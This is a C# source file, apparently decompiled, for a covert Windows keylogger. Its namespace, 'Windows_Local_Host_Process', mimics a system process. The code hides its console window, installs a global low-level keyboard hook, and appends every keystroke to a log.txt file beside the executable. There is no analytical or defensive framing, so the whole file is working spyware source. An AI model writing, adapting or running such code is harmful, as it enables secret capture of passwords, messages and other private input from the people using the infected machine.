using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Windows_Local_Host_Process
{
	// Token: 0x02000002 RID: 2
	internal class InterceptKeys
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public static void Main()
		{
			IntPtr consoleWindow = InterceptKeys.GetConsoleWindow();
			InterceptKeys.ShowWindow(consoleWindow, 0);
			InterceptKeys._hookID = InterceptKeys.SetHook(InterceptKeys._proc);
			Application.Run();
			InterceptKeys.UnhookWindowsHookEx(InterceptKeys._hookID);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002084 File Offset: 0x00000284
		private static IntPtr SetHook(InterceptKeys.LowLevelKeyboardProc proc)
		{
			IntPtr result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				using (ProcessModule mainModule = currentProcess.MainModule)
				{
					result = InterceptKeys.SetWindowsHookEx(13, proc, InterceptKeys.GetModuleHandle(mainModule.ModuleName), 0u);
				}
			}
			return result;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020EC File Offset: 0x000002EC
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			bool flag = nCode >= 0 && wParam == (IntPtr)256;
			if (flag)
			{
				int num = Marshal.ReadInt32(lParam);
				StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\log.txt", true);
				Keys keys = (Keys)num;
				if (keys <= Keys.LMenu)
				{
					if (keys == Keys.Return)
					{
						streamWriter.Write(Environment.NewLine);
						goto IL_12D;
					}
					if (keys == Keys.Space)
					{
						streamWriter.Write(" ");
						goto IL_12D;
					}
					switch (keys)
					{
					case Keys.LShiftKey:
						goto IL_12D;
					case Keys.RShiftKey:
						goto IL_12D;
					case Keys.LMenu:
						streamWriter.Write("{ALT}");
						goto IL_12D;
					}
				}
				else
				{
					if (keys == Keys.Oemcomma)
					{
						streamWriter.Write(",");
						goto IL_12D;
					}
					if (keys == Keys.OemPeriod)
					{
						streamWriter.Write(".");
						goto IL_12D;
					}
					if (keys == Keys.OemQuotes)
					{
						streamWriter.Write("'");
						goto IL_12D;
					}
				}
				bool flag2 = Control.ModifierKeys != Keys.Shift;
				if (flag2)
				{
					streamWriter.Write(((char)num).ToString().ToLower());
				}
				else
				{
					streamWriter.Write((Keys)num);
				}
				IL_12D:
				streamWriter.Close();
			}
			return InterceptKeys.CallNextHookEx(InterceptKeys._hookID, nCode, wParam, lParam);
		}

		// Token: 0x06000004 RID: 4
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, InterceptKeys.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x06000005 RID: 5
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x06000006 RID: 6
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000007 RID: 7
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000008 RID: 8
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x06000009 RID: 9
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x04000001 RID: 1
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x04000002 RID: 2
		private const int WM_KEYDOWN = 256;

		// Token: 0x04000003 RID: 3
		private const int sw_HIDE = 0;

		// Token: 0x04000004 RID: 4
		private static InterceptKeys.LowLevelKeyboardProc _proc = new InterceptKeys.LowLevelKeyboardProc(InterceptKeys.HookCallback);

		// Token: 0x04000005 RID: 5
		private static IntPtr _hookID = IntPtr.Zero;

		// Token: 0x02000003 RID: 3
		// (Invoke) Token: 0x0600000D RID: 13
		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}

